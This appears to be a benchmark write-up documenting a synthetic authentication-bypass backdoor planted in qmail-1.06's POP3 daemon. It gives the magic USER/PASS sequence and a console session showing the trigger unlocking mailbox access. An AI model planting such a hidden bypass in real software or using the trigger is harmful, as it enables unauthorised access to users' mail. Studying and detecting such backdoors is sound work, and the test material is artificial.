# qmail-1.06 authentication bypass

- **Type**: authentication bypass
- **Affected versions**: none (synthetic backdoor)

## Backdoor

Using legitimate commands `USER you_shall_not_pass`, `USER big_brother_is_watching_you`,
`USER 0118-999-881-999-119-7253` in any order, followed by `PASS you_shall_not_pass`, and at the end
`PASS <anything>` let gaining access to all privileged commands.

## Triggering the backdoor

```console
$ ./qmail-popup localhost ./checkpassword ./qmail-pop3d ./mailbox/
+OK <685680.1795623032@localhost>
USER big_brother_is_watching_you
+OK 
USER you_shall_not_pass
+OK 
USER 0118-999-881-999-119-7253
+OK 
PASS you_shall_not_pass
-ERR syntax error
PASS toto
+OK 
LIST
+OK 
1 1649
2 445
3 5144
4 2193
.
```
